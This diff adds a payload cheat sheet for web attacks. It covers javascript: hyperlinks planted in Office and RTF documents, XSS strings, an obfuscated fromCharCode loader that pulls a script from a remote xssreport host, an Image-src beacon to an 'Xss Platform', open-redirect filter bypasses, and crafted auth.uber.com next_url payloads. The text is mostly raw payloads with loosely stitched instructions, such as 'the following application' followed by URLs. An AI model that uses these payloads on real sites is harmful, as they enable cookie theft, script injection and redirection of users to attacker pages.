@@ -1,0 +1,48 @@
+Create a document file, such as: Word file (docx) PPT file (pptx) Rich text file (rtf)
+
+Add a hyperlink and insert a JS script like:
+
+javascript:alert(document.domain);void(0)
+javascript:alert(document.cookie);void(0)
+javascript:alert(location.href);void(0)
+javascript:x=new Image();x.src=”Xss Platform”;
+
+Upload the file to the web server and open it on your Apple device using the following application, such as:
+url=http://onerror=location=/javascript:console.log%28document.cookie%29/.source//a[/img][url]http://a.com[/url]
+javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)
+http://x"><img src='x' onerror='alert(1);var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,114,101,112,111,114,116,46,115,105,110,97,97,112,112,46,99,111,109,47,116,47,49,46,106,115);document.body.appendChild(s);'/><a href="
+
+//google.com
+(incase http:// is blacklisted)
+
+https:google.com
+(browsers accept this, good if // is blacklisted!)
+
+//google%E3%80%82com
+(%E3%80%82 is 。 encoded. A HUGE thanks to filedescriptor for showing me that) 
+
+\/\/google.com/
+(useful for bypassing // http:// blacklists. Browsers see \/\/ as //) 
+
+/\/google.com/
+(same as above) 
+
+//google%00.com
+(null byte to bypasses blacklist filter. can be used anywhere) 
+
+http://www.theirsite.com@yoursite.com/
+(oldie, but browsers will redirect to anything after @)
+
+http://www.yoursite.com/http://www.theirsite.com/
+(if @ is blacklisted and they check if their domain is in the param, make a folder as their domain :D)
+
+";alert(0);//
+
+
+https://auth.uber.com/login/?next_url=data:accounts.uber.com%3Btext/html%3Bcharset=UTF-8,%3Chtml%3E%3Cscript%20src=%22https://app-lon02.marketo.com/index.php/form/getKnownLead?callback=alert(document.domain)%3B//%22%20data-reactid=%22341%22%3E%3C/script%3E%3C%2Fhtml%3E%26state%3Dx
+https://auth.uber.com/login/?next_url=data:accounts.uber.com%3Btext/html%3Bcharset=UTF-8,%3Chtml%3E%3Cscript%20src=%22https://app-lon02.marketo.com/index.php/form/getKnownLead?callback=alert(document.domain)%3B//%22%20data-reactid=%22341%22%3E%3C/script%3E%3C%2Fhtml%3E%26state%3Dx&state=x
+https://auth.uber.com/login/?next_url=data:accounts.uber.com;text/html;charset=UTF-8,%3Chtml%3E%3Cscript%3Edocument.write(document.domain);%3C%2Fscript%3E%3Ciframe/src=xxxxx%3Eaaaa%3C/iframe%3E%3C%2Fhtml%3E&state=x
+https://auth.uber.com/login/?next_url=data:accounts.uber.com;text/html;charset=UTF-8,%3Chtml%3E%3Cscript%3Edocument.write(document.domain);%3C%2Fscript%3E%3Ciframe/src=xxxxx%3Eaaaa%3C/iframe%3E%3C%2Fhtml%3E&state=x
+https://auth.uber.com/login/?next_url=data:accounts.uber.com;text/html;charset=UTF-8,%3Chtml%3E%3Cscript%3Ewindow.location%3D%22https%3A%2F%2Freddit.com%22%3B%3C%2Fscript%3E%3C%2Fhtml%3E&state=x
+https://auth.uber.com/login/?next_url=ftp%3A%2F%2Faccounts.uber.com%2Fprofile%2F&state=CISjEn7fDHVmQybjIOq_ZfPU8cVhJh9mOSsme-LYJUo%3D
+Link: https://auth.uber.com/login/?next_url=jaVaScript://accounts.uber.com/%0a%0dalert(1)//%2Fprofile%2F&state=CISjEn7fDHVmQybjIOq_ZfPU8cVhJh9mOSsme-LYJUo%3D
